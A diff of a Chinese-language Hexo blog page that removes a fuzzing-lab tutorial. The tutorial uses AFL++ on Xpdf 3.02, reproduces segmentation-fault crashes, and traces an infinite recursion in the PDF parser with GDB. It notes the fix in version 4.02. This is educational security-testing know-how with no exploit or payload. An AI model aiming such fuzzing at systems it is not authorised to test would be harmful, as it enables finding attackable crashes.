-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update # 安装依赖</span><br><span class="line">sudo apt-get install -y build-essential python3-dev automake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools</span><br><span class="line">sudo apt-get install -y lld-11 llvm-11 llvm-11-dev clang-11 || sudo apt-get install -y lld llvm llvm-dev clang </span><br><span class="line">sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#x27;s/.* //&#x27;|sed &#x27;s/\..*//&#x27;)-dev</span><br><span class="line"></span><br><span class="line">cd $HOME # 安装AFL++</span><br><span class="line">git clone https://github.com/AFLplusplus/AFLplusplus &amp;&amp; cd AFLplusplus</span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot;</span><br><span class="line">make distrib</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-<p>AFL 是一个 <strong>coverage-guided fuzzer</strong>，这意味着它为每个变异的输入收集覆盖信息，以发现新的执行路径和潜在的错误</p>
-<ul>
-<li>当源代码可用时，AFL 可以使用插桩，在每个基本块（函数、循环等）的开头插入函数调用</li>
-<li>要想我们的目标应用程序启用检测，我们需要使用 AFL 的编译器编译代码</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME/fuzzing_xpdf/install # 清理所有之前编译的目标文件和可执行文件</span><br><span class="line">cd $HOME/fuzzing_xpdf/xpdf-3.02/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">export LLVM_CONFIG=&quot;llvm-config-11&quot; # 现在我们将使用afl-clang-fast编译器构建xpdf</span><br><span class="line">CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<ul>
-<li>在 AFL 编译文件时候 afl-gcc 会在规定位置插入桩代码，可以理解为一个个的探针（但是没有暂停功能），在后续 fuzz 的过程中会根据这些桩代码进行路径探索，测试等</li>
-<li>AFL 通过插桩的形式注入到被编译的程序中，实现对分支（branch、edge）覆盖率的捕获，以及分支节点计数</li>
-</ul>
-<p>我们可以使用以下命令测试 pdfinfo 二进制文件：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/install/bin/pdftotext @@ $HOME/fuzzing_xpdf/output</span><br></pre></td></tr></table></figure>
-<ul>
-<li><em>-i</em> ：表示我们必须放置输入案例的目录（a.k.a 文件示例）</li>
-</ul>
-<ul>
-<li><em>-o</em> ：表示 AFL++ 将存储变异文件的目录</li>
-<li><em>-s</em> ：表示要使用的静态随机种子</li>
-<li><em>@@</em> ：是占位符目标的命令行，AFL 将用每个输入文件名替换</li>
-</ul>
-<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660312674524.png" class width="1660312674524">  
-<ul>
-<li>红色的 uniq. crash 值，显示发现的唯一崩溃数</li>
-<li>您可以在 <code>$HOME/fuzzing_xpdf/out/</code> 目录中找到这些崩溃文件</li>
-<li>一旦发现第一次崩溃，您就可以停止模糊器，这是我们将要处理的问题（根据您的机器性能，最多可能需要一到两个小时才能发生崩溃）</li>
-</ul>
-<h2 id="Do-it-yourself"><a href="#Do-it-yourself" class="headerlink" title="Do it yourself!"></a>Do it yourself!</h2><p>为了完成这个练习，你需要：</p>
-<ul>
-<li>用指定的文件重现崩溃</li>
-<li>调试 crash 发现问题</li>
-<li>修复问题</li>
-</ul>
-<p>PS：预计时间 = 120 分钟</p>
-<p>通过上一个部分我们已经获取了两个 crash，在 <code>$HOME/fuzzing_xpdf/out/default/crashes</code> 中可以找到：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  crashes ls</span><br><span class="line">id:<span class="number">000000</span>,sig:<span class="number">11</span>,src:<span class="number">000000</span>+<span class="number">000810</span>,time:<span class="number">45712</span>,execs:<span class="number">44457</span>,op:splice,rep:<span class="number">16</span></span><br><span class="line">id:<span class="number">000001</span>,sig:<span class="number">11</span>,src:<span class="number">000726</span>,time:<span class="number">62396</span>,execs:<span class="number">61755</span>,op:havoc,rep:<span class="number">2</span></span><br><span class="line">README.txt</span><br></pre></td></tr></table></figure>
-<p>在使用 crash 文件进行调试前，我们需要先了解一下 Xpdf</p>
-<h2 id="Xpdf"><a href="#Xpdf" class="headerlink" title="Xpdf"></a>Xpdf</h2><p>Xpdf 是可移植文档格式 (PDF) 文件的开源查看器（这些有时也被称为“Acrobat”文件，来自 Adobe 的 PDF 软件的名称）</p>
-<ul>
-<li>Xpdf 项目还包括 PDF 文本提取器、PDF 到 PostScript 转换器和各种其他实用程序</li>
-<li>Xpdf 在 UNIX、VMS 和 OS/2 上的 X 窗口系统下运行，非 X 组件（pdftops、pdftotext 等）也可以在 Win32 系统上运行，并且应该可以在几乎任何具有像样 C++ 编译器的系统上运行</li>
-<li>Xpdf 被设计为小巧高效，它可以使用 Type 1 或 TrueType 字体</li>
-</ul>
-<p>要运行 Xpdf，只需键入：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xpdf file.pdf</span><br></pre></td></tr></table></figure>
-<p>要生成 PostScript 文件，请点击 xpdf 中的“打印”按钮，或运行 pdftops：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftops file.pdf</span><br></pre></td></tr></table></figure>
-<p>要生成纯文本文件，请运行 pdftotext：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext file.pdf</span><br></pre></td></tr></table></figure>
-<p>一共有5个实用程序（在他们的手册页中有完整的描述）：</p>
-<ul>
-<li>pdftotext — 通过 PDF 文件生成纯文本文件</li>
-<li>pdfinfo — 转储 PDF 文件的信息字典（加上其他一些有用的信息）</li>
-<li>pdffonts — 列出 PDF 文件中使用的字体以及各种每种字体的信息</li>
-<li>pdftops — 将 PDF 文件转换为一系列 PPM/PGM/PBM 格式位图</li>
-<li>pdfimages — 从 PDF 文件中提取图像</li>
-</ul>
-<h2 id="Reproduce-the-crash"><a href="#Reproduce-the-crash" class="headerlink" title="Reproduce the crash"></a>Reproduce the crash</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 /home/yhellow/fuzzing_xpdf/install/bin </span><br><span class="line">cd /home/yhellow/fuzzing_xpdf/install/bin</span><br><span class="line">mv id:000000,sig:11,src:000000+000810,time:45712,execs:44457,op:splice,rep:16 test.pdf</span><br></pre></td></tr></table></figure>
-<p>依次使用 <code>pdftotext</code> <code>pdfinfo</code> <code>pdffonts</code> <code>pdftops</code> <code>pdfimages</code> 运行测试文件：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftotext test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3065 segmentation fault  ./pdftotext test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfinfo test.pdf          </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">Subject:        </span></span><br><span class="line"><span class="function">Keywords:       </span></span><br><span class="line"><span class="function">Author:         Administrator</span></span><br><span class="line"><span class="function">Creator:        PDFCreator 2.0.2.0</span></span><br><span class="line"><span class="function">Producer:       Pator 2.0.2.0</span></span><br><span class="line"><span class="function">CreationDate:   Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">ModDate:        Sun Jul 26 00:25:22 2015</span></span><br><span class="line"><span class="function">Tagged:         no</span></span><br><span class="line"><span class="function">Pages:          1</span></span><br><span class="line"><span class="function">Encrypted:      no</span></span><br><span class="line"><span class="function">Page size:      595 x 842 <span class="title">pts</span> <span class="params">(A4)</span></span></span><br><span class="line"><span class="function">File size:      4109 bytes</span></span><br><span class="line"><span class="function">Optimized:      no</span></span><br><span class="line"><span class="function">PDF version:    0.0</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdffonts test.pdf </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">name                                 type              emb sub uni object ID</span></span><br><span class="line"><span class="function">------------------------------------ ----------------- --- --- --- ---------</span></span><br><span class="line"><span class="function">Times-Roman </span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdftops test.pdf        </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3141 segmentation fault  ./pdftops test.pdf <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  bin ./pdfimages test.pdf test     </span><br><span class="line">Error: <span class="function">May <span class="keyword">not</span> be a PDF <span class="title">file</span> <span class="params">(continuing anyway)</span></span></span><br><span class="line"><span class="function">Error: PDF file is damaged - attempting to reconstruct xref table...</span></span><br><span class="line"><span class="function">[1]    3236 segmentation fault  ./pdfimages test.pdf test <span class="comment">/* 段错误 */</span></span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>其中 <code>pdftotext</code> <code>pdftops</code> <code>pdfimages</code> 出现了段错误</li>
-<li>我们先用 GDB 调试 <code>pdftotext</code>：</li>
-</ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb --args ./pdftotext ./test.pdf</span><br></pre></td></tr></table></figure>
-<ul>
-<li>使用 GDB <code>bt</code> 命令来获取栈回溯：</li>
-</ul>
-<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/1660445660783.png" class width="1660445660783"> 
-<ul>
-<li>发现程序的行为异常，不断调用 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code>，程序无限递归最终崩溃（经过测试，<code>pdftops</code> <code>pdfimages</code> 中的段错误也是这个原因）</li>
-</ul>
-<p>我们在 <code>Object::dictLookup</code> <code>Parser::makeStream</code> <code>Parser::getObj</code> <code>XRef::fetch</code> 处打上断点，配合源码用 GDB 单步调试：</p>
-<ul>
-<li>触发断点的顺序如下：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Parser::getObj(若干次) -&gt; Parser::makeStream -&gt; Object::dictLookup -&gt; XRef::fetch</span><br></pre></td></tr></table></figure>
-<ul>
-<li>分析 <code>Parser::makeStream -&gt; Object::dictLookup</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dict-&gt;dictLookup(<span class="string">&quot;Length&quot;</span>, &amp;obj); <span class="comment">/* 正常调用dictLookup */</span></span><br><span class="line"><span class="keyword">if</span> (obj.isInt()) &#123;</span><br><span class="line">  length = (Guint)obj.getInt();</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(getPos(), <span class="string">&quot;Bad &#x27;Length&#x27; attribute in stream&quot;</span>);</span><br><span class="line">  obj.<span class="built_in">free</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>分析 <code>Object::dictLookup -&gt; XRef::fetch</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> Object *<span class="title">Object::dictLookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span></span></span><br><span class="line"><span class="function">  </span>&#123; <span class="keyword">return</span> dict-&gt;lookup(key, obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Object *<span class="title">Dict::lookup</span><span class="params">(<span class="keyword">char</span> *key, Object *obj)</span> </span>&#123;</span><br><span class="line">  DictEntry *e;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (e = find(key)) ? e-&gt;val.fetch(xref, obj) : obj-&gt;initNull(); <span class="comment">/* 正常调用fetch */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>分析 <code>XRef::fetch -&gt; Parser::getObj</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   parser-&gt;getObj(&amp;obj1); <span class="comment">/* 会调用4次getObj */</span></span><br><span class="line">   parser-&gt;getObj(&amp;obj2);</span><br><span class="line">   parser-&gt;getObj(&amp;obj3);</span><br><span class="line">   <span class="keyword">if</span> (!obj1.isInt() || obj1.getInt() != num ||</span><br><span class="line">!obj2.isInt() || obj2.getInt() != gen ||</span><br><span class="line">!obj3.isCmd(<span class="string">&quot;obj&quot;</span>)) &#123;</span><br><span class="line">     obj1.<span class="built_in">free</span>();</span><br><span class="line">     obj2.<span class="built_in">free</span>();</span><br><span class="line">     obj3.<span class="built_in">free</span>();</span><br><span class="line">     <span class="keyword">delete</span> parser;</span><br><span class="line">     <span class="keyword">goto</span> err;</span><br><span class="line">   &#125;</span><br><span class="line">   parser-&gt;getObj(obj, encrypted ? fileKey : (Guchar *)<span class="literal">NULL</span>,</span><br><span class="line">	   encAlgorithm, keyLength, num, gen);</span><br><span class="line">   obj1.<span class="built_in">free</span>();</span><br><span class="line">   obj2.<span class="built_in">free</span>();</span><br><span class="line">   obj3.<span class="built_in">free</span>();</span><br></pre></td></tr></table></figure>
-<ul>
-<li>分析 <code>Parser::getObj -&gt; Parser::getObj</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">while</span> (!buf1.isCmd(<span class="string">&quot;&gt;&gt;&quot;</span>) &amp;&amp; !buf1.isEOF()) &#123;</span><br><span class="line">     <span class="keyword">if</span> (!buf1.isName()) &#123;</span><br><span class="line">error(getPos(), <span class="string">&quot;Dictionary key must be a name object&quot;</span>);</span><br><span class="line">shift();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">key = copyString(buf1.getName());</span><br><span class="line">shift();</span><br><span class="line"><span class="keyword">if</span> (buf1.isEOF() || buf1.isError()) &#123;</span><br><span class="line">  gfree(key);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,</span><br><span class="line">			 objNum, objGen)); <span class="comment">/* 多次调用dictAdd,在其中调用getObj */</span></span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-<ul>
-<li>分析 <code>Parser::getObj -&gt; Parser::makeStream</code>：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (allowStreams &amp;&amp; buf2.isCmd(<span class="string">&quot;stream&quot;</span>)) &#123;</span><br><span class="line">  <span class="keyword">if</span> ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,</span><br><span class="line">   objNum, objGen))) <span class="comment">/* 正常调用makeStream */</span></span><br></pre></td></tr></table></figure>
-<p>从整个调用链来看，程序的运行逻辑就是闭合的，可能作者需要这种递归调用来完成一些工作，盲猜作者在涉及调用条件时出现了一些问题：</p>
-<ul>
-<li><code>Parser::makeStream -&gt; Object::dictLookup</code> 和 <code>Object::dictLookup -&gt; XRef::fetch</code> 都是无条件调用，这里应该不会出现问题</li>
-<li><code>XRef::fetch</code> 中调用了4次 <code>getObj</code>，<code>Parser::getObj</code> 中通过多次调用 <code>dictAdd</code> 来调用 <code>getObj</code>，但它们的调用都是有条件的，如果某一次的传入的 <code>Object</code> 结构体设置不对，就可能导致无限调用</li>
-</ul>
-<p>下载 4.02 版本代码，对比 <code>Parser.cc</code>，可以看到此漏洞被修复：</p>
-<img src="/2022/08/14/Fuzz%20Lab1-Xpdf/2308014-20210907124158811-1900620626.png" class title="2308014-20210907124158811-1900620626"> 
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/15/">15</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
   </nav>
 
 
@@ -2616,7 +2881,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">140</span>
+          <span class="site-state-item-count">141</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2665,12 +2930,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="Symbols count total">1.8m</span>
+    <span title="Symbols count total">1.9m</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">27:45</span>
+    <span title="Reading time total">28:07</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
